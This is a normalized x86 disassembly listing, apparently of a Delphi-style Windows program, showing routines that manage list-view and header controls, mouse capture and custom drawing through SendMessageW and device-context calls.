mov eax ebx
call sub_4ac624
mov esi eax
test esi esi
je r-xdata
mov cl 0x1
mov edx 0x2
mov eax esi
call sub_4a7d20
jmp r-xdata
xor ecx ecx
mov edx 0x2
mov eax esi
call sub_4a7d20
sub_4ac6a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
movzx eax [ ebp - 0x1 ]
cmp eax 0x4
ja r-xdata
test edi edi
je r-xdata
jmp [ eax * 4 + jump_table_4ac6d6 ]
or edi 0xffffffff
mov eax edi
call sub_4a801c
mov edi eax
jmp r-xdata
mov esi 0x100
jmp r-xdata
mov esi 0x200
jmp r-xdata
mov esi 0x400
jmp r-xdata
mov esi 0x800
jmp r-xdata
xor esi esi
test [ ebp + 0x8 ] 0x4
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
test [ ebp + 0x8 ] 0x8
je r-xdata
or esi 0x8
test [ ebp + 0x8 ] 0x10
je r-xdata
or esi 0x1
mov eax ebx
call sub_496868
mov ecx esi
mov edx edi
call sub_41f914
mov edi eax
cmp edi 0xffffffff
je r-xdata
or esi 0x2
mov edx edi
mov eax [ ebx + 0x28c ]
call sub_4a81f0
mov [ ebp - 0x8 ] eax
sub_4ac774
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
mov [ esp + 0x8 ] 0x40
mov eax [ esp ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x18 ] eax
movzx eax bl
mov eax [ eax * 4 + rw-data ]
mov [ esp + 0x1c ] eax
mov eax esi
call sub_496868
lea edx [ esp + 0x8 ]
push edx
push 0xffffffff
push 0x1053
push eax
call SendMessageW
cmp eax 0xffffffff
je r-xdata
xor eax eax
mov edx eax
mov eax [ esi + 0x28c ]
call sub_4a81f0
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
sub_4ac7e0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov ebp ecx
mov edi edx
mov ebx eax
xor esi esi
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax esi
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0x14 ]
mov edx ebp
mov eax edi
call sub_432a5c
mov eax [ esp + 0x14 ]
mov [ esp ] eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_496868
mov edx esp
push edx
push 0x0
push 0x1012
push eax
call SendMessageW
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x28c ]
call sub_4a81f0
mov esi eax
sub_4ac84c
push ebx
push esi
push edi
mov ebx edx
call sub_496868
mov edi eax
movzx eax bl
mov esi [ eax * 4 + rw-data ]
push 0x0
push esi
push 0x1016
push edi
call SendMessageW
pop edi
pop esi
pop ebx
retn
sub_4ac874
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x2f5 ] 0x0
jne r-xdata
mov eax [ ebx + 0x29c ]
call sub_4254d8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4acce8
inc edi
dec esi
jne r-xdata
sub_4ac8e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_4ac9e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_496c14
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4ac9eb
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
mov eax [ edi + 0x28c ]
call sub_4a81b8
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ edi + 0x28c ]
call sub_4a81b8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ edi + 0x3e0 ]
call sub_4254d8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax [ edi + 0x28c ]
call sub_4a81b8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax [ edi + 0x28c ]
mov edx ebx
call sub_4a81f0
mov eax [ eax + 0x2c ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
mov eax [ edi + 0x28c ]
mov edx ebx
call sub_4a81f0
or edx 0xffffffff
call sub_4a7b44
inc ebx
dec esi
jne r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax edi
call sub_4ac9f4
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x28c ]
mov edx ebx
call sub_4a81f0
mov edx [ ebp - 0x4 ]
mov edx [ edx + ebx * 4 ]
call sub_4a7b44
inc ebx
dec esi
jne r-xdata
sub_4ac9f4
push ebx
push esi
push edi
push ebp
add esp 0xffffffa0
mov edi edx
mov esi eax
mov eax esi
call sub_496c14
test al al
je r-xdata
add esp 0x60
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esp
xor ecx ecx
mov edx 0x60
call sub_447ae4
mov edx edi
mov eax [ esi + 0x3e0 ]
call sub_4afe4c
mov ebx eax
mov eax esi
call sub_496868
mov ebp eax
mov edx edi
mov eax [ esi + 0x3e0 ]
call sub_4afe4c
mov eax [ eax + 0x14 ]
push 0x0
push eax
push 0x1096
push ebp
call SendMessageW
mov [ esp + 0x4 ] 0xc
cmp [ ebx + 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
or [ esp + 0x4 ] 0x1
mov [ esp ] 0x60
mov eax [ ebx + 0xc ]
call sub_449db8
mov [ esp + 0x8 ] eax
mov eax [ ebx + 0x10 ]
call sub_449db8
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_449db8
mov [ esp + 0x28 ] eax
mov eax [ ebx + 0x20 ]
call sub_449db8
mov [ esp + 0x38 ] eax
mov eax [ ebx + 0x24 ]
call sub_449db8
mov [ esp + 0x40 ] eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
or [ esp + 0x4 ] 0x2
mov [ esp + 0xc ] eax
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov [ esp + 0x2c ] eax
mov eax [ ebx + 0x20 ]
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov [ esp + 0x3c ] eax
mov eax [ ebx + 0x24 ]
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov [ esp + 0x44 ] eax
xor eax eax
mov [ esp + 0x1c ] eax
xor eax eax
mov [ esp + 0x20 ] eax
mov edx edi
mov eax [ esi + 0x3e0 ]
call sub_4afe4c
call sub_4af8e0
test al 0x1
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx edi
mov eax [ esi + 0x3e0 ]
call sub_4afe4c
call sub_4af8e0
test al 0x2
je r-xdata
or [ esp + 0x20 ] 0x0
xor eax eax
mov [ esp + 0x24 ] eax
xor edx edx
mov eax 0x6
call sub_43a7f0
test al al
je r-xdata
or [ esp + 0x20 ] 0x2
movzx eax [ ebx + 0x1a ]
test al al
jne r-xdata
mov eax [ esp + 0x4 ]
or eax 0x1000
or eax 0x2000
mov [ esp + 0x4 ] eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp al 0x1
jne r-xdata
or [ esp + 0x24 ] 0x1
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
or [ esp + 0x4 ] 0x100
cmp al 0x2
jne r-xdata
or [ esp + 0x24 ] 0x4
jmp r-xdata
mov eax [ ebx + 0x28 ]
mov [ esp + 0x48 ] eax
mov eax [ ebx + 0x2c ]
mov [ esp + 0x4c ] eax
or [ esp + 0x4 ] 0x10
mov edx edi
mov eax [ esi + 0x3e0 ]
call sub_4afe4c
mov eax [ eax + 0x14 ]
mov [ esp + 0x18 ] eax
mov eax esi
call sub_496868
mov edx esp
push edx
push edi
push 0x1091
push eax
call SendMessageW
cmp [ ebx + 0x24 ] 0x0
je r-xdata
or [ esp + 0x4 ] 0x400
or [ esp + 0x24 ] 0x2
mov edx edi
mov eax [ esi + 0x3e0 ]
call sub_4afe4c
call sub_4af8e0
test al 0x8
je r-xdata
or [ esp + 0x4 ] 0x800
mov edx edi
mov eax [ esi + 0x3e0 ]
call sub_4afe4c
call sub_4af8e0
test al 0x10
je r-xdata
or [ esp + 0x20 ] 0x4
mov edx edi
mov eax [ esi + 0x3e0 ]
call sub_4afe4c
call sub_4af8e0
test al 0x4
je r-xdata
or [ esp + 0x20 ] 0x8
mov edx edi
mov eax [ esi + 0x3e0 ]
call sub_4afe4c
call sub_4af8e0
test al 0x20
je r-xdata
or [ esp + 0x20 ] 0x1
mov edx edi
mov eax [ esi + 0x3e0 ]
call sub_4afe4c
call sub_4af8e0
test al 0x40
je r-xdata
or [ esp + 0x20 ] 0x10
mov edx edi
mov eax [ esi + 0x3e0 ]
call sub_4afe4c
call sub_4af8e0
test al 0x80
je r-xdata
or [ esp + 0x20 ] 0x20
mov edx edi
mov eax [ esi + 0x3e0 ]
call sub_4afe4c
call sub_4af8e0
test ah 0x1
je r-xdata
or [ esp + 0x20 ] 0x40
movzx eax [ ebx + 0x1b ]
test al al
jne r-xdata
or [ esp + 0x20 ] 0x80
cmp al 0x1
jne r-xdata
or [ esp + 0x24 ] 0x8
jmp r-xdata
cmp al 0x2
jne r-xdata
or [ esp + 0x24 ] 0x20
jmp r-xdata
or [ esp + 0x24 ] 0x10
sub_4acce8
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov ebp edx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x29c ]
call sub_4a734c
mov edi eax
mov [ esp + 0x8 ] 0x15
mov eax [ edi + 0x1c ]
mov [ esp + 0x20 ] eax
mov eax [ edi + 0x10 ]
call sub_449db8
mov [ esp + 0x14 ] eax
movzx eax [ edi + 0xc ]
mov [ esp ] al
mov eax edi
call sub_425180
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0xc ] eax
mov eax ebx
mov si 0xffc7
call sub_4483f8
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
movzx edx [ esp ]
mov eax [ eax + edx * 4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
and [ esp + 0x8 ] 0xffffffef
mov eax [ esp + 0xc ]
or eax 0x800
or eax 0x8000
mov [ esp + 0xc ] eax
jmp r-xdata
cmp [ edi + 0x1c ] 0xffffffff
je r-xdata
mov eax ebx
call sub_496868
mov esi eax
mov edx ebp
mov eax [ ebx + 0x29c ]
call sub_4a734c
mov eax [ eax + 0x28 ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push 0x1060
push esi
call SendMessageW
cmp [ ebx + 0x26d ] 0x2
jne r-xdata
or [ esp + 0x8 ] 0x2
mov [ esp + 0x10 ] eax
mov eax ebx
call sub_496868
mov esi eax
mov edx ebp
mov eax [ ebx + 0x29c ]
call sub_4a734c
mov ebx [ eax + 0x28 ]
lea eax [ esp + 0x8 ]
push eax
push ebx
push 0x1060
push esi
call SendMessageW
jmp r-xdata
mov eax [ edi + 0x24 ]
cmp eax 0xffffffff
jle r-xdata
cmp [ ebx + 0x26d ] 0x3
jne r-xdata
mov eax ebx
call sub_496868
mov ecx [ edi + 0x24 ]
or edx 0xffffffff
call sub_41f990
jmp r-xdata
cmp [ ebx + 0x2a4 ] 0x0
jne r-xdata
mov edx ebp
mov eax [ ebx + 0x29c ]
call sub_4a734c
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_496868
mov ecx [ edi + 0x24 ]
pop edx
call sub_41f990
sub_4ace54
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov edi edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xd8 ]
movzx eax [ edi + 0x4 ]
call sub_476e90
mov ebx eax
mov [ esi + 0x290 ] 0x0
mov [ esi + 0x2c4 ] 0xffffffff
mov edx edi
mov eax esi
call sub_48fcfc
mov eax esi
call sub_48d12c
cmp al 0x1
jne r-xdata
cmp [ esi + 0x290 ] 0x0
je r-xdata
cmp [ esi + 0x288 ] 0x0
je r-xdata
mov eax esi
call sub_48d12c
cmp al 0x1
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0xc ]
mov edx esp
mov eax esi
call sub_48dac0
movzx eax [ esp + 0xc ]
mov [ esp + 0x14 ] ax
movzx eax [ esp + 0x10 ]
mov [ esp + 0x16 ] ax
mov eax [ esp + 0x14 ]
mov [ esp + 0x8 ] eax
mov eax esi
call sub_48e800
test al al
jne r-xdata
test bl 0x1
jne r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x288 ] 0x0
je r-xdata
movzx eax [ esp + 0x8 ]
movzx eax ax
movzx edx [ esp + 0xa ]
movzx edx dx
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x202
call GetCapture
push eax
call SendMessageW
jmp r-xdata
movzx eax [ esp + 0x8 ]
movzx eax ax
movzx edx [ esp + 0xa ]
movzx edx dx
shl edx 0x10
or eax edx
push eax
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_48f2b0
mov [ esi + 0x290 ] 0x0
jmp r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_4ac7e0
mov ebp eax
test ebp ebp
je r-xdata
test bl 0x1
jne r-xdata
cmp [ esi + 0x290 ] 0x0
jne r-xdata
mov edx 0x3
mov eax ebp
call sub_4a7cb0
test al al
je r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_4ac7e0
mov ebp eax
test ebp ebp
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_48e71c
mov edx 0x3
mov eax ebp
call sub_4a7cb0
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_48e71c
jmp r-xdata
sub_4acfe0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_4ad164
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_48d878
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
call sub_4254d8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4ad16b
mov eax [ ebp - 0x14 ]
call sub_4481b0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_4ad147
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax esi
call sub_4a7128
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_424590
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4246e8
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
mov edx ebx
call sub_4a734c
mov esi eax
cmp [ esi + 0xd ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4246e8
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_4a71a8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax esi
call sub_4a7128
cmp edi eax
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4245dc
mov eax esi
call sub_4a7128
sub [ ebp - 0xc ] eax
sub_4ad174
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_494928
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax ebx
call sub_4acfe0
sub_4ad1a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
movzx esi [ eax + 0x10 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
call sub_46e3b0
xor eax eax
push ebp
push sub_4ad2c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
call sub_46e950
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
call sub_46e7e4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1b8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
call sub_46e800
mov eax [ ebp - 0x10 ]
mov edi [ eax + 0x8 ]
cmp edi 0xffffffff
jne r-xdata
push esi
mov edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_4a81f0
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
mov eax [ ebp - 0x10 ]
lea edx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
call sub_46e300
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4ad2c9
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
xor edx edx
call sub_46e950
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
call sub_46e7bc
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_4ad2e4
test cl cl
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x31a ] 0x0
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x362 ] 0x0
jne r-xdata
cmp [ eax + 0x30a ] 0x0
jne r-xdata
cmp [ eax + 0x312 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x362 ] 0x0
jne r-xdata
cmp [ eax + 0x352 ] 0x0
jne r-xdata
cmp [ eax + 0x35a ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x31a ] 0x0
jne r-xdata
mov al 0x1
cmp [ eax + 0x312 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x35a ] 0x0
jne r-xdata
retn
xor eax eax
jmp r-xdata
mov al 0x1
retn
cmp [ eax + 0x30a ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x312 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x31a ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x35a ] 0x0
jne r-xdata
cmp [ eax + 0x362 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x312 ] 0x0
jne r-xdata
cmp [ eax + 0x31a ] 0x0
jne r-xdata
cmp [ eax + 0x362 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x31a ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub_4ad3f8
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x30a ] 0x0
je r-xdata
cmp [ esi + 0x352 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push ebx
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0x30c ]
call [ esi + 0x308 ]
push esp
mov ecx edi
mov edx esi
mov eax [ esi + 0x354 ]
call [ esi + 0x350 ]
sub_4ad450
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x6 ] cx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x7 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x312 ] 0x0
je r-xdata
cmp [ esi + 0x35a ] 0x0
je r-xdata
movzx eax [ ebp - 0x7 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
movzx eax [ ebp - 0x6 ]
push eax
push ebx
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x314 ]
call [ esi + 0x310 ]
movzx eax [ ebp - 0x6 ]
push eax
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x35c ]
call [ esi + 0x358 ]
sub_4ad4c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x31a ] 0x0
je r-xdata
cmp [ esi + 0x362 ] 0x0
je r-xdata
movzx eax [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
push ebx
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x31c ]
call [ esi + 0x318 ]
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x364 ]
call [ esi + 0x360 ]
sub_4ad53c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebx + 0x268 ]
call sub_48c748
cmp [ ebx + 0x392 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x268 ]
call sub_46e300
mov eax [ esi + 0x20 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x268 ]
call sub_46e4f0
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x394 ]
call [ ebx + 0x390 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4ad5b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x3b2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x3b4 ]
call [ ebx + 0x3b0 ]
sub_4ad5f8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4ad74f
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x268 ]
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_46e058
mov eax [ ebx + 0x2f0 ]
call sub_4254d8
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4ad756
lea eax [ ebp - 0x2c ]
mov edx 0x2
call j_sub_44936c
retn
inc eax
mov [ ebp - 0xc ] eax
xor edi edi
inc edi
dec [ ebp - 0xc ]
jne r-xdata
xor edx edx
mov eax [ esi + 0x10 ]
call sub_46dcf4
mov edx edi
mov eax [ ebx + 0x2f0 ]
call sub_4a7614
mov edx [ eax + 0x20 ]
mov eax [ esi + 0xc ]
call sub_46d5ac
mov edx edi
mov eax [ ebx + 0x2f0 ]
call sub_4a7614
lea edx [ ebp - 0x2c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_46e4f0
mov edx edi
mov eax [ ebx + 0x2f0 ]
call sub_4a7614
mov edx [ eax + 0x20 ]
mov eax [ esi + 0x10 ]
call sub_46dc10
mov dl 0x2
mov eax [ esi + 0x10 ]
call sub_46dcf4
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4ac2bc
mov eax [ ebp - 0x24 ]
neg eax
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4ac2bc
mov eax [ ebp - 0x20 ]
neg eax
mov [ ebp - 0x8 ] eax
mov edx edi
mov eax [ ebx + 0x2f0 ]
call sub_4a7614
push esi
push edi
lea esi [ eax + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_432b28
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_46e440
mov edx edi
mov eax [ ebx + 0x2f0 ]
call sub_4a7614
lea edx [ ebp - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp [ ebp - 0x28 ] 0x0
je r-xdata
sub_4ad760
push ebx
mov ebx eax
mov eax ebx
call sub_494494
movzx eax [ ebx + 0x26d ]
sub al 0x2
jae r-xdata
pop ebx
retn
cmp [ ebx + 0x2f4 ] 0x0
je r-xdata
mov eax ebx
call sub_4ad5f8
sub_4ad7a0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4ad8ba
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3ba ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_490ae8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x2c ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_4ac7e0
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4ad8c1
lea eax [ ebp - 0x4 ]
